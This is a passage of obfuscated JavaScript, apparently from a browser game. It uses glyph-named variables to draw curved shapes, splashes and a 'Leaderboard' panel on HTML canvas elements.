			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.scale(ΔᐃⲆΔ, 3);
			Δ.translate(ΔⲆᐃᐃΔΔᐃ, 10 * ᐃ);
			if (ⵠᐃ == ⵠΔⵠΔ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * ⲆΔⵠᐃ, ᐃ * 32);
				Δ.bezierCurveTo(ᐃ * 19, ᐃ * 25, 19 * ᐃ, ᐃ * 25, ᐃ * 34, ᐃ * 18);
				Δ.bezierCurveTo(ᐃ * 41.5, ᐃ * 23.5, 41.5 * ᐃ, 23.5 * ᐃ, ᐃ * 49, 29 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 59.5, ᐃ * ΔᐃⲆⵠᐃ, ᐃ * 59.5, ᐃ * 20, 70 * ᐃ, ⵠⲆⲆᐃⲆⵠⵠ * ᐃ);
				ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[ΔΔᐃΔ], 28 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(56 * ᐃ, 6 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 63.5, ᐃ * 13.5, 63.5 * ᐃ, 13.5 * ᐃ, 71 * ᐃ, ᐃ * 21);
				Δ.bezierCurveTo(ᐃ * 74.5, 11.5 * ᐃ, ᐃ * 74.5, ᐃ * 11.5, ᐃ * 78, ᐃ * ᐃⵠⲆⲆⲆ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], 28 * ᐃ)
			}
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * ⲆⲆⲆΔ, ᐃ * 32);
			Δ.bezierCurveTo(ᐃ * 19, 25 * ᐃ, ΔⲆⲆⲆⵠ * ᐃ, 25 * ᐃ, 34 * ᐃ, ᐃ * 18);
			Δ.bezierCurveTo(ᐃ * 41.5, 23.5 * ᐃ, ᐃ * 41.5, ᐃ * 23.5, ᐃ * 49, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 59.5, ᐃ * Δⵠᐃᐃᐃ, ᐃ * 59.5, ᐃ * ⲆΔⲆⲆΔ, ᐃ * 70, ᐃ * 11);
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 17);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(56 * ᐃ, ᐃ * 6);
			Δ.bezierCurveTo(63.5 * ᐃ, 13.5 * ᐃ, ᐃ * 63.5, 13.5 * ᐃ, ᐃ * 71, ᐃ * 21);
			Δ.bezierCurveTo(74.5 * ᐃ, ᐃ * 11.5, ᐃ * 74.5, ᐃ * 11.5, 78 * ᐃ, ᐃ * ᐃⵠⲆⲆⲆ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⲆΔ], ᐃ * 17);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃⲆᐃⲆⵠ * ᐃ, ᐃ * 32);
			Δ.bezierCurveTo(ᐃ * ⲆⲆⵠᐃⲆΔⲆ, 25 * ᐃ, ᐃ * ᐃΔⲆΔⵠ, 25 * ᐃ, 34 * ᐃ, ⲆⵠⲆᐃΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41.5, 23.5 * ᐃ, 41.5 * ᐃ, 23.5 * ᐃ, ᐃ * 49, ᐃ * 29);
			Δ.bezierCurveTo(59.5 * ᐃ, ᐃ * ᐃΔⲆⵠᐃ, ᐃ * 59.5, ᐃ * 20, ᐃ * 70, ᐃ * 11);
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[2], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(56 * ᐃ, ⲆᐃⲆᐃ * ᐃ);
			Δ.bezierCurveTo(63.5 * ᐃ, 13.5 * ᐃ, ᐃ * 63.5, ᐃ * 13.5, ᐃ * 71, 21 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74.5, ᐃ * 11.5, ᐃ * 74.5, 11.5 * ᐃ, ᐃ * 78, ᐃ * 2);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠⵠⵠΔ], 10 * ᐃ);
			return Ⲇⵠ
		}

		function ᐃᐃΔᐃΔⵠⲆⲆΔ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 200;
			var ⵠⵠᐃ = ᐃ * 180;
			var ⲆⲆⵠ = 8 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.beginPath();
			Ⲇᐃᐃ(Δ, ΔΔⵠ, ᐃⵠⲆⵠ, ᐃⵠⵠ, ⵠⵠᐃ - ⲆⲆⵠ, ⲆⲆⵠ);
			Δ.globalAlpha = .8;
			ΔⲆ(Δ, "#1D6055");
			Δ.globalAlpha = 1;
			var text = ᐃᐃΔΔᐃ(ᐃ, "Leaderboard", 25, ⵠ[253]);
			Δ.drawImage(text, (ᐃⵠⵠ - text.width) / 2, ⵠᐃⲆΔ * ᐃ);
			return Ⲇⵠ
		}

		function ⵠⵠᐃᐃⵠⲆⵠᐃΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (0 == ⵠᐃ) {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = ᐃ * 393;
				Δ.translate(40 * ᐃ, ᐃ * 60);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃⲆᐃᐃ * ᐃ, Δⵠᐃⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
				Δ.moveTo(176 * ᐃ, ᐃ * 10.25);
				Δ.bezierCurveTo(188 * ᐃ, 16.25 * ᐃ, 187 * ᐃ, ᐃ * 25.25, ᐃ * 183, 26.25 * ᐃ);
				Δ.bezierCurveTo(177 * ᐃ, ᐃ * 26.25, ᐃ * 175, ᐃ * 21.25, 173 * ᐃ, ᐃ * 19.25);
				Δ.bezierCurveTo(170 * ᐃ, ᐃ * 14.25, ᐃ * 170, 10.25 * ᐃ, ᐃ * 176, 10.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
				Δ.globalAlpha = 1;
				Δ.translate(-ᐃᐃⲆⲆ * ᐃ, ᐃ * -ᐃᐃⵠⲆᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(176 * ᐃ, ᐃ * 10.25);
				Δ.bezierCurveTo(188 * ᐃ, 16.25 * ᐃ, 187 * ᐃ, ᐃ * 25.25, 183 * ᐃ, ᐃ * 26.25);
				Δ.bezierCurveTo(ᐃ * 177, 26.25 * ᐃ, ᐃ * 175, 21.25 * ᐃ, ᐃ * 173, 19.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 170, 14.25 * ᐃ, 170 * ᐃ, ᐃ * 10.25, 176 * ᐃ, ᐃ * 10.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆⲆΔⲆ * ᐃ, ᐃ * ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(274 * ᐃ, 8 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 276, 12 * ᐃ, ᐃ * 271, 23 * ᐃ, ᐃ * 266, ⵠᐃΔᐃᐃ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 264, ᐃ * 19, ᐃ * 262, ᐃ * ⵠᐃⲆΔᐃᐃⲆ, 267 * ᐃ, ΔΔΔᐃᐃ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 271, ᐃⲆⵠΔ * ᐃ, 274 * ᐃ, 5 * ᐃ, ᐃ * 274, ᐃ * ᐃⵠⵠⵠⲆ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ⲆⲆΔⲆ, ᐃ * -ⵠᐃⵠⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 274, ᐃ * ⵠᐃΔΔᐃⲆⵠ);
				Δ.bezierCurveTo(276 * ᐃ, ᐃ * ⵠⲆΔΔᐃ, ᐃ * 271, 23 * ᐃ, ᐃ * 266, ᐃ * ΔΔⲆⵠᐃ);
				Δ.bezierCurveTo(264 * ᐃ, ⲆⲆⵠᐃⲆΔⲆ * ᐃ, 262 * ᐃ, 15 * ᐃ, ᐃ * 267, 9 * ᐃ);
				Δ.bezierCurveTo(271 * ᐃ, ΔΔᐃⲆ * ᐃ, ᐃ * 274, 5 * ᐃ, 274 * ᐃ, ᐃ * ⲆⲆᐃⵠΔ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
				Δ.moveTo(ᐃ * 282, 23.25 * ᐃ);
				Δ.bezierCurveTo(275 * ᐃ, 25.25 * ᐃ, ᐃ * 272, ᐃ * 29.25, 274 * ᐃ, 36.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 277, 40.25 * ᐃ, ᐃ * 280, ᐃ * 37.25, 283 * ᐃ, 32.25 * ᐃ);
				Δ.bezierCurveTo(286 * ᐃ, ᐃ * 26.25, 286 * ᐃ, 25.25 * ᐃ, ᐃ * 282, 23.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -ᐃᐃⵠⲆᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(282 * ᐃ, 23.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 275, 25.25 * ᐃ, ᐃ * 272, ᐃ * 29.25, 274 * ᐃ, ᐃ * 36.25);
				Δ.bezierCurveTo(ᐃ * 277, ᐃ * 40.25, 280 * ᐃ, ᐃ * 37.25, 283 * ᐃ, 32.25 * ᐃ);
				Δ.bezierCurveTo(286 * ᐃ, ᐃ * 26.25, ᐃ * 286, 25.25 * ᐃ, ᐃ * 282, ᐃ * 23.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * ΔⲆᐃⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(343.75 * ᐃ, 18.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 346.75, ᐃ * 27.25, 346.75 * ᐃ, 32.25 * ᐃ, 339.75 * ᐃ, 31.25 * ᐃ);
				Δ.bezierCurveTo(336.75 * ᐃ, ᐃ * 29.25, 335.75 * ᐃ, 27.25 * ᐃ, 336.75 * ᐃ, 22.25 * ᐃ);
				Δ.bezierCurveTo(336.75 * ᐃ, ᐃ * 16.25, 338.75 * ᐃ, ᐃ * 15.25, 343.75 * ᐃ, 18.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
				Δ.globalAlpha = 1;
				Δ.translate(-ᐃⲆΔⵠ * ᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 343.75, 18.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 346.75, 27.25 * ᐃ, ᐃ * 346.75, ᐃ * 32.25, 339.75 * ᐃ, ᐃ * 31.25);
				Δ.bezierCurveTo(336.75 * ᐃ, 29.25 * ᐃ, 335.75 * ᐃ, 27.25 * ᐃ, ᐃ * 336.75, 22.25 * ᐃ);
				Δ.bezierCurveTo(336.75 * ᐃ, 16.25 * ᐃ, 338.75 * ᐃ, ᐃ * 15.25, 343.75 * ᐃ, 18.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃⵠⲆΔᐃ * ᐃ, ᐃ * ⵠⵠⵠⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(364.75 * ᐃ, ᐃ * 22.25);
				Δ.bezierCurveTo(ᐃ * 368.75, ᐃ * 27.25, 362.75 * ᐃ, ᐃ * 36.25, 356.75 * ᐃ, ᐃ * 39.25);
				Δ.bezierCurveTo(346.75 * ᐃ, ᐃ * 43.25, ᐃ * 346.75, ᐃ * 34.25, 348.75 * ᐃ, 31.25 * ᐃ);
				Δ.bezierCurveTo(352.75 * ᐃ, ᐃ * 23.25, 360.75 * ᐃ, 20.25 * ᐃ, ᐃ * 363.75, ᐃ * 22.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, -ⲆΔⵠⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 364.75, 22.25 * ᐃ);
				Δ.bezierCurveTo(368.75 * ᐃ, 27.25 * ᐃ, 362.75 * ᐃ, 36.25 * ᐃ, 356.75 * ᐃ, 39.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 346.75, ᐃ * 43.25, ᐃ * 346.75, ᐃ * 34.25, ᐃ * 348.75, ᐃ * 31.25);
				Δ.bezierCurveTo(ᐃ * 352.75, 23.25 * ᐃ, 360.75 * ᐃ, ᐃ * 20.25, ᐃ * 363.75, 22.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ΔⲆΔᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 350.75, ᐃ * 52.25);
				Δ.bezierCurveTo(352.75 * ᐃ, ᐃ * 45.25, 360.75 * ᐃ, ᐃ * 43.25, 368.75 * ᐃ, 52.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 369.75, ᐃ * 58.25, ᐃ * 366.75, 59.25 * ᐃ, 357.75 * ᐃ, 57.25 * ᐃ);
				Δ.bezierCurveTo(350.75 * ᐃ, 56.25 * ᐃ, ᐃ * 352.75, 55.25 * ᐃ, ᐃ * 350.75, 52.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(-ⵠⵠⵠⵠ * ᐃ, -ΔΔⵠΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 350.75, 52.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 352.75, 45.25 * ᐃ, ᐃ * 360.75, ᐃ * 43.25, 368.75 * ᐃ, ᐃ * 52.25);
				Δ.bezierCurveTo(369.75 * ᐃ, 58.25 * ᐃ, 366.75 * ᐃ, 59.25 * ᐃ, 357.75 * ᐃ, 57.25 * ᐃ);
				Δ.bezierCurveTo(350.75 * ᐃ, 56.25 * ᐃ, ᐃ * 352.75, 55.25 * ᐃ, ᐃ * 350.75, 52.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃ * ΔᐃⲆΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 421.75, ᐃ * 81.25);
				Δ.bezierCurveTo(ᐃ * 432.75, 85.25 * ᐃ, 431.75 * ᐃ, 89.25 * ᐃ, ᐃ * 426.75, ᐃ * 93.25);
				Δ.bezierCurveTo(418.75 * ᐃ, 95.25 * ᐃ, 414.75 * ᐃ, 93.25 * ᐃ, 412.75 * ᐃ, ᐃ * 89.25);
				Δ.bezierCurveTo(411.75 * ᐃ, ᐃ * 84.25, ᐃ * 413.75, 81.25 * ᐃ, ᐃ * 421.75, ᐃ * 81.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
				Δ.globalAlpha = ⵠΔⲆ;
				Δ.translate(-3 * ᐃ, -ⵠΔΔΔΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(421.75 * ᐃ, ᐃ * 81.25);
				Δ.bezierCurveTo(432.75 * ᐃ, ᐃ * 85.25, ᐃ * 431.75, 89.25 * ᐃ, 426.75 * ᐃ, ᐃ * 93.25);
				Δ.bezierCurveTo(ᐃ * 418.75, ᐃ * 95.25, ᐃ * 414.75, 93.25 * ᐃ, ᐃ * 412.75, ᐃ * 89.25);
				Δ.bezierCurveTo(411.75 * ᐃ, ᐃ * 84.25, 413.75 * ᐃ, 81.25 * ᐃ, 421.75 * ᐃ, ᐃ * 81.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(432.75 * ᐃ, ᐃ * 105.25);
				Δ.bezierCurveTo(430.75 * ᐃ, 115.25 * ᐃ, ᐃ * 411.75, 130.25 * ᐃ, 408.75 * ᐃ, 117.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 407.75, 106.25 * ᐃ, ᐃ * 414.75, 103.25 * ᐃ, 421.75 * ᐃ, 101.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 430.75, 100.25 * ᐃ, ᐃ * 432.75, ᐃ * 101.25, 432.75 * ᐃ, 105.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -3, ᐃ * -ⵠᐃⵠⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
				Δ.moveTo(432.75 * ᐃ, 105.25 * ᐃ);
				Δ.bezierCurveTo(430.75 * ᐃ, ᐃ * 115.25, ᐃ * 411.75, ᐃ * 130.25, ᐃ * 408.75, 117.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 407.75, 106.25 * ᐃ, ᐃ * 414.75, ᐃ * 103.25, 421.75 * ᐃ, ᐃ * 101.25);
				Δ.bezierCurveTo(430.75 * ᐃ, 100.25 * ᐃ, 432.75 * ᐃ, ᐃ * 101.25, ᐃ * 432.75, 105.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ΔΔⵠΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 422.75, 153.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 437.75, 155.25 * ᐃ, ᐃ * 442.75, ᐃ * 158.25, ᐃ * 436.75, ᐃ * 165.25);
				Δ.bezierCurveTo(431.75 * ᐃ, ᐃ * 170.25, ᐃ * 424.75, 167.25 * ᐃ, ᐃ * 419.75, 163.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 413.75, ᐃ * 157.25, 415.75 * ᐃ, ᐃ * 153.25, ᐃ * 422.75, ᐃ * 153.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
				Δ.globalAlpha = ΔⲆᐃᐃ;
				Δ.translate(ᐃ * -3, -ⲆᐃΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
				Δ.moveTo(ᐃ * 422.75, ᐃ * 153.25);
				Δ.bezierCurveTo(437.75 * ᐃ, ᐃ * 155.25, 442.75 * ᐃ, 158.25 * ᐃ, ᐃ * 436.75, 165.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 431.75, ᐃ * 170.25, ᐃ * 424.75, 167.25 * ᐃ, ᐃ * 419.75, 163.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 413.75, 157.25 * ᐃ, ᐃ * 415.75, 153.25 * ᐃ, ᐃ * 422.75, 153.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ᐃⲆΔⵠ, Δⵠᐃⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 409.75, 158.25 * ᐃ);
				Δ.bezierCurveTo(409.75 * ᐃ, ᐃ * 168.25, ᐃ * 401.75, 172.25 * ᐃ, 397.75 * ᐃ, ᐃ * 167.25);
				Δ.bezierCurveTo(394.75 * ᐃ, ᐃ * 159.25, ᐃ * 407.75, 150.25 * ᐃ, 408.75 * ᐃ, ᐃ * 158.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -3, ᐃ * -ΔΔᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(409.75 * ᐃ, ᐃ * 158.25);
				Δ.bezierCurveTo(409.75 * ᐃ, ᐃ * 168.25, 401.75 * ᐃ, 172.25 * ᐃ, 397.75 * ᐃ, ᐃ * 167.25);
				Δ.bezierCurveTo(394.75 * ᐃ, ᐃ * 159.25, ᐃ * 407.75, 150.25 * ᐃ, ᐃ * 408.75, 158.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆΔⵠⵠ * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 204, ᐃ * 238.25);
				Δ.bezierCurveTo(204 * ᐃ, ᐃ * 248.25, 184 * ᐃ, ᐃ * 255.25, 180 * ᐃ, 247.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 177, ᐃ * 241.25, 187 * ᐃ, ᐃ * 236.25, ᐃ * 192, ᐃ * 235.25);
				Δ.bezierCurveTo(201 * ᐃ, 233.25 * ᐃ, ᐃ * 204, ᐃ * 233.25, ᐃ * 204, ᐃ * 238.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
				Δ.globalAlpha = ⵠΔⲆ;
				Δ.translate(-3 * ᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(204 * ᐃ, ᐃ * 238.25);
				Δ.bezierCurveTo(ᐃ * 204, ᐃ * 248.25, ᐃ * 184, 255.25 * ᐃ, ᐃ * 180, ᐃ * 247.25);
				Δ.bezierCurveTo(177 * ᐃ, 241.25 * ᐃ, ᐃ * 187, ᐃ * 236.25, 192 * ᐃ, 235.25 * ᐃ);
				Δ.bezierCurveTo(201 * ᐃ, 233.25 * ᐃ, 204 * ᐃ, ᐃ * 233.25, 204 * ᐃ, 238.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ⵠΔΔΔΔ, ᐃ * ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 208, ᐃ * 246.25);
				Δ.bezierCurveTo(ᐃ * 202, ᐃ * 255.25, 204 * ᐃ, ᐃ * 258.25, ᐃ * 212, 255.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 217, ᐃ * 250.25, ᐃ * 217, 248.25 * ᐃ, 216 * ᐃ, ᐃ * 244.25);
				Δ.bezierCurveTo(210 * ᐃ, ᐃ * 241.25, 209 * ᐃ, ᐃ * 245.25, ᐃ * 208, 246.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -ⵠⵠⵠᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(ᐃ * 208, 246.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 202, 255.25 * ᐃ, ᐃ * 204, ᐃ * 258.25, 212 * ᐃ, ᐃ * 255.25);
				Δ.bezierCurveTo(ᐃ * 217, 250.25 * ᐃ, ᐃ * 217, ᐃ * 248.25, ᐃ * 216, ᐃ * 244.25);
				Δ.bezierCurveTo(ᐃ * 210, ᐃ * 241.25, 209 * ᐃ, 245.25 * ᐃ, ᐃ * 208, ᐃ * 246.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ΔⲆᐃⲆ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(197 * ᐃ, ᐃ * 258.25);
				Δ.bezierCurveTo(194 * ᐃ, ᐃ * 265.25, ᐃ * 186, 270.25 * ᐃ, 185 * ᐃ, 262.25 * ᐃ);
				Δ.bezierCurveTo(187 * ᐃ, ᐃ * 255.25, 191 * ᐃ, ᐃ * 252.25, ᐃ * 195, ᐃ * 253.25);
				Δ.bezierCurveTo(ᐃ * 198, ᐃ * 256.25, ᐃ * 197, ᐃ * 257.25, 197 * ᐃ, ᐃ * 258.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ]);
				Δ.globalAlpha = ᐃᐃⵠ;
				Δ.translate(-ΔᐃⲆΔ * ᐃ, ᐃ * -ⲆᐃΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(197 * ᐃ, ᐃ * 258.25);
				Δ.bezierCurveTo(194 * ᐃ, 265.25 * ᐃ, 186 * ᐃ, ᐃ * 270.25, ᐃ * 185, ᐃ * 262.25);
				Δ.bezierCurveTo(187 * ᐃ, 255.25 * ᐃ, 191 * ᐃ, ᐃ * 252.25, 195 * ᐃ, 253.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 198, 256.25 * ᐃ, 197 * ᐃ, ᐃ * 257.25, ᐃ * 197, 258.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ⵠⵠⵠⵠ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
				Δ.moveTo(24 * ᐃ, 111.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 32, 115.25 * ᐃ, 29 * ᐃ, 123.25 * ᐃ, ᐃ * 22, 133.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * ᐃⲆⵠⵠᐃ, 140.25 * ᐃ, ᐃⵠⵠᐃᐃ * ᐃ, ᐃ * 137.25, ΔΔΔᐃᐃ * ᐃ, 125.25 * ᐃ);
				Δ.bezierCurveTo(ⲆⲆΔΔⵠΔⲆ * ᐃ, ᐃ * 114.25, ᐃ * ΔᐃⲆⵠᐃ, ᐃ * 110.25, 24 * ᐃ, 111.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⵠΔⵠΔ;
